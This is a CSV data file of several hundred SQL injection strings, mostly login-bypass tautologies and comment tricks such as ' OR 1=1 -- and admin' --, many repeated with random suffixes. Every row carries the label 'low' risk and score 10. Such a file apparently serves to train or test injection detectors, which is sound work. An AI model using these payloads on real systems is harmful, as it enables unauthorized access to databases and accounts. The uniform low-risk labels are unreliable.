query,risk,score
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' /**/ # s,low,10
admin' -- # b,low,10
' OR 1=1 LIMIT 1 -- # d,low,10
' OR 1=1 LIMIT 1 -- # p,low,10
""" OR ""1""=""1 -- ",low,10
1' or '1'='1 # n,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' -- # b,low,10
' OR 'a'='a # m,low,10
admin' -- -- ,low,10
1' or '1'='1 # j,low,10
""" OR ""1""=""1 # i",low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
1' or 1=1 -- # 1,low,10
1' or 1=1 -- -- ,low,10
1' or true -- -- ,low,10
' || 1=1 -- # b,low,10
1' or true -- -- ,low,10
admin' /**/ -- ,low,10
1' or '1'='1 -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' or 'a'='a # z,low,10
1' or 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' -- # p,low,10
' OR 'x'='x -- ,low,10
' || 1=1 -- # n,low,10
admin' /**/ -- ,low,10
' OR 1=1 -- # d,low,10
' OR 'x'='x -- ,low,10
' or 'a'='a # q,low,10
' || 1=1 -- # m,low,10
1' or 1=1 -- # g,low,10
' OR 1=1 -- -- ,low,10
1' or true -- # y,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 'a'='a # i,low,10
' OR 1=1 -- -- ,low,10
admin' -- # 7,low,10
' OR 1=1 -- -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' || 1=1 -- # j,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' || 1=1 -- -- ,low,10
1' or true -- -- ,low,10
admin' -- -- ,low,10
1' or '1'='1 -- ,low,10
' || 1=1 -- # o,low,10
admin' -- -- ,low,10
1' or '1'='1 # u,low,10
' OR 'a'='a # z,low,10
1' or 1=1 -- -- ,low,10
admin' -- # 2,low,10
1' or '1'='1 # 1,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
admin' -- -- ,low,10
admin' -- # g,low,10
' or 'a'='a -- ,low,10
' OR 1 IN (SELECT @@version) -- # 5,low,10
' OR 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' or 'a'='a # v,low,10
1' or '1'='1 -- ,low,10
admin' -- -- ,low,10
' OR 1=1 LIMIT 1 -- # a,low,10
' OR 'a'='a -- ,low,10
admin' -- # u,low,10
admin' /**/ # 0,low,10
' OR 'a'='a # 6,low,10
admin' -- # 9,low,10
' || 1=1 -- -- ,low,10
admin' -- # k,low,10
1' OR '1'='1 # x,low,10
' or 'a'='a # n,low,10
1' or 1=1 -- # s,low,10
' OR 1 IN (SELECT @@version) -- # f,low,10
' OR 1=1 -- -- ,low,10
' or 'a'='a -- ,low,10
admin' -- -- ,low,10
' OR 1=1 -- -- ,low,10
admin' -- # v,low,10
' OR 1=1 -- # r,low,10
1' or true -- -- ,low,10
admin' -- # c,low,10
1' or 1=1 -- -- ,low,10
' OR 1=1 -- # i,low,10
1' or 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- # b,low,10
1' or 1=1 -- -- ,low,10
admin' /**/ # 7,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' || 1=1 -- # r,low,10
' OR 'a'='a -- ,low,10
1' or true -- -- ,low,10
' OR 1=1 LIMIT 1 -- # 8,low,10
' OR 'x'='x # 9,low,10
admin' -- -- ,low,10
' OR 'a'='a -- ,low,10
1' or '1'='1 -- ,low,10
' OR 'a'='a -- ,low,10
""" OR ""1""=""1 -- ",low,10
' OR 'a'='a -- ,low,10
""" OR ""1""=""1 # z",low,10
1' or 1=1 -- -- ,low,10
admin' /**/ -- ,low,10
admin' -- -- ,low,10
admin' -- -- ,low,10
1' or 1=1 -- -- ,low,10
1' or true -- # j,low,10
' || 1=1 -- -- ,low,10
1' or 1=1 -- -- ,low,10
admin' -- # 0,low,10
admin' /**/ # 3,low,10
""" OR ""1""=""1 -- ",low,10
1' OR '1'='1 -- ,low,10
1' or true -- -- ,low,10
admin' -- -- ,low,10
' OR 'x'='x # b,low,10
admin' -- -- ,low,10
' or 'a'='a # m,low,10
1' OR '1'='1 # j,low,10
admin' -- -- ,low,10
admin' -- # e,low,10
""" OR ""1""=""1 # y",low,10
1' OR '1'='1 -- ,low,10
' OR 'x'='x -- ,low,10
""" OR ""1""=""1 # t",low,10
admin' -- -- ,low,10
' OR 1=1 LIMIT 1 -- # t,low,10
1' or true -- # 0,low,10
' OR 'a'='a -- ,low,10
' OR 'a'='a # s,low,10
' || 1=1 -- -- ,low,10
admin' /**/ # n,low,10
1' or 1=1 -- -- ,low,10
' OR 1=1 -- -- ,low,10
1' or '1'='1 # g,low,10
admin' -- # s,low,10
' OR 'x'='x # z,low,10
' OR 'x'='x -- ,low,10
' or 'a'='a # x,low,10
' OR 'a'='a -- ,low,10
' || 1=1 -- # 6,low,10
1' OR '1'='1 -- ,low,10
1' or true -- -- ,low,10
admin' -- -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 'x'='x # k,low,10
' OR 'a'='a # x,low,10
1' or '1'='1 # t,low,10
' OR 'x'='x -- ,low,10
' OR 1 IN (SELECT @@version) -- # o,low,10
1' OR '1'='1 # x,low,10
""" OR ""1""=""1 # q",low,10
' OR 1=1 -- -- ,low,10
admin' -- # 0,low,10
' OR 1 IN (SELECT @@version) -- # 5,low,10
1' or 1=1 -- # l,low,10
' OR 'a'='a -- ,low,10
' OR 1=1 -- -- ,low,10
admin' /**/ -- ,low,10
admin' /**/ -- ,low,10
admin' -- -- ,low,10
1' or true -- # 4,low,10
admin' -- -- ,low,10
admin' /**/ -- ,low,10
' OR 'x'='x # e,low,10
' OR 1=1 -- # l,low,10
1' or '1'='1 # 6,low,10
' OR 'a'='a # p,low,10
""" OR ""1""=""1 -- ",low,10
admin' /**/ # 4,low,10
""" OR ""1""=""1 -- ",low,10
admin' /**/ # m,low,10
' OR 1=1 LIMIT 1 -- # y,low,10
' OR 1=1 -- # 3,low,10
1' OR '1'='1 # u,low,10
' || 1=1 -- # j,low,10
' OR 'x'='x -- ,low,10
' || 1=1 -- # m,low,10
' OR 'x'='x # v,low,10
' OR 1 IN (SELECT @@version) -- # 2,low,10
1' OR '1'='1 # d,low,10
admin' /**/ # b,low,10
admin' /**/ -- ,low,10
admin' /**/ # 7,low,10
admin' /**/ -- ,low,10
' || 1=1 -- # o,low,10
' or 'a'='a # k,low,10
' OR 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
1' or true -- # w,low,10
1' OR '1'='1 # t,low,10
1' or '1'='1 # z,low,10
admin' -- # 3,low,10
' OR 1=1 -- # x,low,10
' OR 'a'='a -- ,low,10
admin' /**/ # 9,low,10
admin' -- # w,low,10
' || 1=1 -- -- ,low,10
' OR 'a'='a # y,low,10
1' or true -- -- ,low,10
1' OR '1'='1 -- ,low,10
' OR 'a'='a -- ,low,10
' OR 'x'='x -- ,low,10
' || 1=1 -- # g,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 'x'='x -- ,low,10
' or 'a'='a # w,low,10
' OR 'a'='a # s,low,10
' || 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
' OR 'a'='a -- ,low,10
1' OR '1'='1 # 3,low,10
1' or 1=1 -- -- ,low,10
1' or 1=1 -- -- ,low,10
1' or '1'='1 -- ,low,10
' OR 'a'='a # r,low,10
' OR 'a'='a # s,low,10
' OR 1 IN (SELECT @@version) -- # t,low,10
1' or 1=1 -- # z,low,10
admin' -- -- ,low,10
1' OR '1'='1 -- ,low,10
1' or true -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1=1 -- # h,low,10
1' OR '1'='1 -- ,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1=1 LIMIT 1 -- # z,low,10
' OR 'a'='a # r,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 1=1 -- # y,low,10
admin' -- -- ,low,10
' OR 1=1 LIMIT 1 -- # 3,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 'x'='x # y,low,10
' or 'a'='a -- ,low,10
admin' /**/ # s,low,10
admin' -- # w,low,10
' OR 1 IN (SELECT @@version) -- # x,low,10
1' or 1=1 -- # m,low,10
' || 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # p,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' /**/ -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' or 'a'='a # 5,low,10
' OR 'x'='x -- ,low,10
1' or 1=1 -- # i,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- # q,low,10
' OR 1=1 -- -- ,low,10
1' or '1'='1 # 6,low,10
admin' -- -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 1=1 -- # k,low,10
1' or '1'='1 -- ,low,10
admin' /**/ # w,low,10
1' OR '1'='1 -- ,low,10
admin' /**/ -- ,low,10
1' or '1'='1 -- ,low,10
1' or 1=1 -- -- ,low,10
' or 'a'='a -- ,low,10
' || 1=1 -- # t,low,10
1' or '1'='1 -- ,low,10
' OR 'a'='a -- ,low,10
' OR 1=1 -- -- ,low,10
""" OR ""1""=""1 # a",low,10
' OR 'a'='a -- ,low,10
' OR 'a'='a -- ,low,10
' OR 'x'='x -- ,low,10
1' or true -- # l,low,10
' OR 1 IN (SELECT @@version) -- # 6,low,10
1' or 1=1 -- -- ,low,10
1' OR '1'='1 # x,low,10
' OR 1=1 -- -- ,low,10
admin' /**/ # r,low,10
' OR 'x'='x -- ,low,10
admin' /**/ -- ,low,10
' || 1=1 -- # l,low,10
' OR 'x'='x # b,low,10
1' or 1=1 -- -- ,low,10
1' or '1'='1 -- ,low,10
' OR 'a'='a # q,low,10
' OR 1 IN (SELECT @@version) -- # b,low,10
' OR 'a'='a # 7,low,10
' OR 1=1 -- # u,low,10
1' or true -- -- ,low,10
' OR 'a'='a -- ,low,10
' or 'a'='a # s,low,10
' OR 1 IN (SELECT @@version) -- # b,low,10
' OR 1=1 -- # 5,low,10
admin' /**/ # d,low,10
1' or 1=1 -- -- ,low,10
admin' -- # 1,low,10
' OR 1=1 LIMIT 1 -- # v,low,10
' or 'a'='a # k,low,10
' OR 'x'='x # t,low,10
' OR 1 IN (SELECT @@version) -- # 7,low,10
' OR 1=1 LIMIT 1 -- # 0,low,10
1' or true -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
admin' -- -- ,low,10
1' or 1=1 -- # 7,low,10
admin' /**/ -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 'a'='a -- ,low,10
admin' -- # e,low,10
' || 1=1 -- -- ,low,10
1' or true -- -- ,low,10
admin' -- # u,low,10
admin' -- -- ,low,10
""" OR ""1""=""1 # 3",low,10
""" OR ""1""=""1 -- ",low,10
1' or true -- -- ,low,10
admin' -- -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 'a'='a # 5,low,10
admin' /**/ # v,low,10
1' or true -- # c,low,10
' OR 1=1 LIMIT 1 -- # 8,low,10
' or 'a'='a -- ,low,10
1' or true -- # e,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' or true -- # y,low,10
1' or 1=1 -- -- ,low,10
admin' -- -- ,low,10
1' or '1'='1 # x,low,10
' || 1=1 -- # b,low,10
1' or true -- -- ,low,10
""" OR ""1""=""1 # l",low,10
' OR 1=1 LIMIT 1 -- # m,low,10
' OR 'a'='a -- ,low,10
admin' /**/ # u,low,10
1' OR '1'='1 # 6,low,10
' || 1=1 -- -- ,low,10
admin' -- -- ,low,10
admin' -- -- ,low,10
1' or true -- -- ,low,10
admin' -- # o,low,10
1' or true -- # 5,low,10
admin' /**/ # 9,low,10
' OR 1=1 LIMIT 1 -- # m,low,10
' OR 1 IN (SELECT @@version) -- # z,low,10
admin' /**/ -- ,low,10
1' or '1'='1 # 8,low,10
' OR 'a'='a # e,low,10
admin' -- # 3,low,10
""" OR ""1""=""1 # 3",low,10
admin' -- -- ,low,10
' OR 1=1 -- # x,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # 4,low,10
admin' /**/ # 2,low,10
' OR 1=1 -- # 4,low,10
1' or 1=1 -- # h,low,10
' or 'a'='a -- ,low,10
' || 1=1 -- # k,low,10
' OR 1=1 -- # n,low,10
1' or 1=1 -- # h,low,10
admin' -- # i,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' /**/ # o,low,10
admin' -- # n,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
1' OR '1'='1 -- ,low,10
1' or true -- -- ,low,10
admin' /**/ # o,low,10
1' or '1'='1 # 6,low,10
1' or '1'='1 # k,low,10
1' or 1=1 -- # a,low,10
' OR 'x'='x -- ,low,10
1' or true -- -- ,low,10
' or 'a'='a # 2,low,10
' OR 1 IN (SELECT @@version) -- # b,low,10
' OR 'x'='x # 2,low,10
1' or 1=1 -- # 8,low,10
' || 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 -- -- ,low,10
1' or '1'='1 -- ,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # t,low,10
1' OR '1'='1 # e,low,10
admin' -- # p,low,10
1' or 1=1 -- # l,low,10
1' or '1'='1 # b,low,10
1' or '1'='1 -- ,low,10
""" OR ""1""=""1 -- ",low,10
' || 1=1 -- -- ,low,10
1' OR '1'='1 # m,low,10
' OR 'x'='x # 7,low,10
' OR 1=1 LIMIT 1 -- # r,low,10
1' or 1=1 -- # e,low,10
1' or '1'='1 -- ,low,10
admin' -- -- ,low,10
admin' -- # 9,low,10
1' or true -- # y,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
admin' -- # u,low,10
1' or true -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 'a'='a # 9,low,10
admin' /**/ -- ,low,10
""" OR ""1""=""1 -- ",low,10
1' or '1'='1 -- ,low,10
' OR 1 IN (SELECT @@version) -- # z,low,10
' OR 'a'='a -- ,low,10
' OR 'a'='a # 9,low,10
' OR 1 IN (SELECT @@version) -- # 4,low,10
' OR 'x'='x -- ,low,10
' || 1=1 -- # b,low,10
1' OR '1'='1 # y,low,10
1' or 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
' OR 1=1 -- # 4,low,10
' or 'a'='a -- ,low,10
' OR 1=1 LIMIT 1 -- # v,low,10
' OR 'a'='a # 0,low,10
1' OR '1'='1 -- ,low,10
' OR 'x'='x -- ,low,10
admin' -- -- ,low,10
1' OR '1'='1 # 5,low,10
1' OR '1'='1 -- ,low,10
admin' -- # u,low,10
""" OR ""1""=""1 -- ",low,10
admin' /**/ # d,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' or 1=1 -- -- ,low,10
' || 1=1 -- -- ,low,10
admin' /**/ # 0,low,10
' OR 1=1 -- # 6,low,10
1' or true -- # z,low,10
admin' -- # y,low,10
' or 'a'='a -- ,low,10
1' or true -- -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 'x'='x # f,low,10
' OR 'a'='a -- ,low,10
1' or 1=1 -- # 2,low,10
admin' /**/ # f,low,10
1' or 1=1 -- -- ,low,10
1' or true -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
' OR 'x'='x # n,low,10
1' or true -- # g,low,10
admin' /**/ -- ,low,10
1' or true -- -- ,low,10
admin' /**/ -- ,low,10
1' OR '1'='1 # 0,low,10
' or 'a'='a # 4,low,10
' OR 'a'='a # 8,low,10
' OR 'a'='a # m,low,10
1' or true -- -- ,low,10
admin' -- # 6,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1 IN (SELECT @@version) -- # v,low,10
' OR 'x'='x # u,low,10
""" OR ""1""=""1 -- ",low,10
1' or '1'='1 -- ,low,10
' || 1=1 -- # e,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' -- -- ,low,10
1' OR '1'='1 -- ,low,10
' OR 'a'='a # o,low,10
1' OR '1'='1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
""" OR ""1""=""1 -- ",low,10
1' or 1=1 -- # i,low,10
admin' /**/ # 7,low,10
admin' -- -- ,low,10
admin' -- -- ,low,10
1' or '1'='1 # a,low,10
""" OR ""1""=""1 -- ",low,10
admin' /**/ # 0,low,10
""" OR ""1""=""1 # r",low,10
' OR 1=1 LIMIT 1 -- # 1,low,10
' OR 1=1 -- # a,low,10
""" OR ""1""=""1 # u",low,10
' || 1=1 -- # 8,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
1' or 1=1 -- -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
admin' -- # p,low,10
' or 'a'='a -- ,low,10
1' or '1'='1 # t,low,10
admin' /**/ -- ,low,10
' OR 1=1 -- # f,low,10
' or 'a'='a # 4,low,10
admin' -- -- ,low,10
1' or true -- -- ,low,10
' or 'a'='a # q,low,10
1' or 1=1 -- # r,low,10
' || 1=1 -- # 1,low,10
admin' /**/ -- ,low,10
admin' /**/ -- ,low,10
1' or true -- -- ,low,10
admin' -- # f,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1=1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- # 9,low,10
admin' /**/ # 0,low,10
""" OR ""1""=""1 -- ",low,10
' OR 'a'='a -- ,low,10
""" OR ""1""=""1 # s",low,10
1' or '1'='1 -- ,low,10
1' or true -- -- ,low,10
' OR 1=1 -- -- ,low,10
' or 'a'='a -- ,low,10
' OR 'a'='a -- ,low,10
1' or true -- -- ,low,10
1' or '1'='1 -- ,low,10
' OR 1 IN (SELECT @@version) -- -- ,low,10
' OR 1=1 -- # k,low,10
' OR 1 IN (SELECT @@version) -- # v,low,10
' OR 'a'='a -- ,low,10
' OR 1=1 -- -- ,low,10
' or 'a'='a -- ,low,10
' OR 'a'='a -- ,low,10
1' or true -- -- ,low,10
' OR 'a'='a # 7,low,10
1' or true -- -- ,low,10
admin' -- -- ,low,10
1' OR '1'='1 # k,low,10
1' OR '1'='1 -- ,low,10
' OR 'a'='a -- ,low,10
admin' -- # g,low,10
' OR 'a'='a # 2,low,10
admin' /**/ -- ,low,10
1' or '1'='1 # a,low,10
' OR 'x'='x -- ,low,10
admin' /**/ -- ,low,10
' OR 1=1 -- -- ,low,10
1' or 1=1 -- -- ,low,10
1' or true -- -- ,low,10
' OR 1=1 -- # s,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1 IN (SELECT @@version) -- # k,low,10
1' OR '1'='1 # w,low,10
admin' -- # u,low,10
' || 1=1 -- -- ,low,10
1' OR '1'='1 -- ,low,10
' || 1=1 -- # a,low,10
' OR 1=1 -- # v,low,10
admin' /**/ -- ,low,10
' or 'a'='a # f,low,10
1' or true -- # 4,low,10
admin' /**/ -- ,low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
' OR 1=1 LIMIT 1 -- # n,low,10
1' or true -- # 8,low,10
admin' -- -- ,low,10
admin' -- # h,low,10
' OR 1=1 -- -- ,low,10
admin' -- # t,low,10
' OR 1 IN (SELECT @@version) -- # v,low,10
""" OR ""1""=""1 # 5",low,10
' or 'a'='a -- ,low,10
admin' -- # i,low,10
' || 1=1 -- # w,low,10
1' or '1'='1 # 2,low,10
""" OR ""1""=""1 -- ",low,10
' OR 1=1 LIMIT 1 -- -- ,low,10
admin' -- -- ,low,10
1' or true -- -- ,low,10
1' or 1=1 -- # 8,low,10
' or 'a'='a -- ,low,10
admin' -- -- ,low,10
' OR 'a'='a # n,low,10
1' or '1'='1 -- ,low,10
admin' -- # 8,low,10
1' or true -- -- ,low,10
1' OR '1'='1 # v,low,10
1' or 1=1 -- # 3,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
1' or '1'='1 AND 1=1,low,10
' OR 'x'='x -- r7hb,low,10
' or 'a'='a /**/ # ,low,10
1' or '1'='1 -- a65x,low,10
' or 'a'='a /**/ # ,low,10
' or 'a'='a /**/ # ,low,10
admin' /**/ AND 1=1,low,10
' OR 1 IN (SELECT @@version) -- -- spay,low,10
' OR 'a'='a OR 1=1 -- ,low,10
""" OR ""1""=""1 /**/ # ",low,10
' OR 'a'='a LIMIT 1,low,10
' OR 'x'='x /**/ # ,low,10
' OR 'x'='x AND 1=1,low,10
1' or '1'='1 # 20su0,low,10
1' or true -- AND 1=1,low,10
' or 'a'='a OR 1=1 -- ,low,10
' or 'a'='a # 8898d,low,10
admin' -- AND 1=1,low,10
""" OR ""1""=""1 -- 3zn3",low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 -- ,low,10
' OR 1=1 -- -- 39ks,low,10
' OR 1=1 -- # v5lfd,low,10
1' or true -- # prwhv,low,10
""" OR ""1""=""1 AND 1=1",low,10
admin' -- # 9jhrw,low,10
' || 1=1 -- # v8kky,low,10
admin' /**/ LIMIT 1,low,10
' || 1=1 -- OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
1' or true -- # wdh60,low,10
admin' /**/ OR 1=1 -- ,low,10
1' or 1=1 -- LIMIT 1,low,10
' OR 'a'='a LIMIT 1,low,10
""" OR ""1""=""1 AND 1=1",low,10
1' OR '1'='1 -- 9xnt,low,10
' OR 'a'='a OR 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 -- ,low,10
1' or '1'='1 LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
1' or true -- OR 1=1 -- ,low,10
admin' -- AND 1=1,low,10
' or 'a'='a /**/ # ,low,10
1' OR '1'='1 LIMIT 1,low,10
' or 'a'='a # crkqh,low,10
1' or '1'='1 -- crne,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1,low,10
1' OR '1'='1 LIMIT 1,low,10
1' or '1'='1 AND 1=1,low,10
1' or 1=1 -- /**/ # ,low,10
1' or true -- AND 1=1,low,10
admin' /**/ -- vyuo,low,10
1' or true -- OR 1=1 -- ,low,10
' or 'a'='a AND 1=1,low,10
' OR 'x'='x AND 1=1,low,10
1' or true -- # 73s3n,low,10
admin' -- OR 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- # oo98r,low,10
1' or '1'='1 LIMIT 1,low,10
1' or '1'='1 OR 1=1 -- ,low,10
admin' -- LIMIT 1,low,10
admin' -- LIMIT 1,low,10
1' OR '1'='1 -- ru3p,low,10
admin' -- AND 1=1,low,10
' or 'a'='a OR 1=1 -- ,low,10
1' or '1'='1 /**/ # ,low,10
1' or true -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
admin' /**/ -- 5zsu,low,10
' || 1=1 -- /**/ # ,low,10
admin' -- OR 1=1 -- ,low,10
1' OR '1'='1 -- ivxk,low,10
' OR 1=1 -- LIMIT 1,low,10
' OR 1=1 -- /**/ # ,low,10
' or 'a'='a LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- # 2l5ru,low,10
admin' /**/ # 01muq,low,10
' OR 'a'='a AND 1=1,low,10
' OR 'a'='a LIMIT 1,low,10
1' OR '1'='1 /**/ # ,low,10
' OR 'a'='a OR 1=1 -- ,low,10
' OR 'a'='a LIMIT 1,low,10
1' or 1=1 -- OR 1=1 -- ,low,10
1' OR '1'='1 # euqcr,low,10
admin' /**/ OR 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- # e3h4f,low,10
' OR 'a'='a /**/ # ,low,10
' OR 'a'='a /**/ # ,low,10
admin' -- # bahum,low,10
1' OR '1'='1 -- x34j,low,10
admin' -- LIMIT 1,low,10
' || 1=1 -- AND 1=1,low,10
' OR 'x'='x /**/ # ,low,10
1' or 1=1 -- -- 7wo2,low,10
1' or 1=1 -- LIMIT 1,low,10
' || 1=1 -- /**/ # ,low,10
1' or '1'='1 AND 1=1,low,10
1' or 1=1 -- /**/ # ,low,10
' OR 1=1 -- AND 1=1,low,10
' OR 1=1 LIMIT 1 -- -- t4ly,low,10
' OR 'a'='a # dbkwu,low,10
' OR 'a'='a -- onhh,low,10
""" OR ""1""=""1 /**/ # ",low,10
' || 1=1 -- LIMIT 1,low,10
1' or true -- AND 1=1,low,10
1' or true -- AND 1=1,low,10
' || 1=1 -- LIMIT 1,low,10
' OR 1 IN (SELECT @@version) -- /**/ # ,low,10
' OR 1=1 -- AND 1=1,low,10
' OR 1=1 -- -- coje,low,10
1' or true -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
' || 1=1 -- AND 1=1,low,10
1' OR '1'='1 /**/ # ,low,10
' || 1=1 -- LIMIT 1,low,10
' OR 1 IN (SELECT @@version) -- -- f8gw,low,10
' OR 'a'='a AND 1=1,low,10
' OR 'x'='x OR 1=1 -- ,low,10
' OR 'a'='a OR 1=1 -- ,low,10
1' or '1'='1 AND 1=1,low,10
1' or true -- # e6bjl,low,10
1' or 1=1 -- /**/ # ,low,10
' OR 1 IN (SELECT @@version) -- # q1mma,low,10
1' or 1=1 -- -- ke2u,low,10
' OR 'x'='x AND 1=1,low,10
admin' -- AND 1=1,low,10
' OR 1=1 -- AND 1=1,low,10
1' OR '1'='1 # lmuy8,low,10
1' or 1=1 -- LIMIT 1,low,10
1' OR '1'='1 OR 1=1 -- ,low,10
admin' -- /**/ # ,low,10
1' OR '1'='1 # 4lnmf,low,10
""" OR ""1""=""1 -- m0r1",low,10
' OR 1=1 LIMIT 1 -- -- v99u,low,10
' OR 1 IN (SELECT @@version) -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- # tvbxp,low,10
admin' -- AND 1=1,low,10
admin' /**/ # y14te,low,10
1' OR '1'='1 LIMIT 1,low,10
' OR 1=1 -- /**/ # ,low,10
' OR 'a'='a /**/ # ,low,10
1' or 1=1 -- -- qccr,low,10
admin' -- -- 422t,low,10
' or 'a'='a AND 1=1,low,10
' || 1=1 -- AND 1=1,low,10
1' or '1'='1 AND 1=1,low,10
1' or '1'='1 OR 1=1 -- ,low,10
1' or 1=1 -- LIMIT 1,low,10
' OR 1 IN (SELECT @@version) -- -- 88ai,low,10
' OR 'a'='a AND 1=1,low,10
' or 'a'='a LIMIT 1,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- /**/ # ,low,10
admin' /**/ OR 1=1 -- ,low,10
' OR 'x'='x /**/ # ,low,10
' OR 1=1 -- -- briz,low,10
' OR 'a'='a -- fil4,low,10
' OR 1=1 -- # cz0wi,low,10
' OR 1 IN (SELECT @@version) -- -- khtz,low,10
1' OR '1'='1 # 2t3o0,low,10
1' or '1'='1 /**/ # ,low,10
1' OR '1'='1 /**/ # ,low,10
' || 1=1 -- AND 1=1,low,10
' OR 1=1 LIMIT 1 -- # 2kf41,low,10
""" OR ""1""=""1 -- 009p",low,10
' OR 1=1 LIMIT 1 -- AND 1=1,low,10
1' OR '1'='1 # r2h61,low,10
""" OR ""1""=""1 LIMIT 1",low,10
admin' -- -- av2b,low,10
' || 1=1 -- # l424e,low,10
1' or 1=1 -- AND 1=1,low,10
""" OR ""1""=""1 OR 1=1 -- ",low,10
admin' -- /**/ # ,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1,low,10
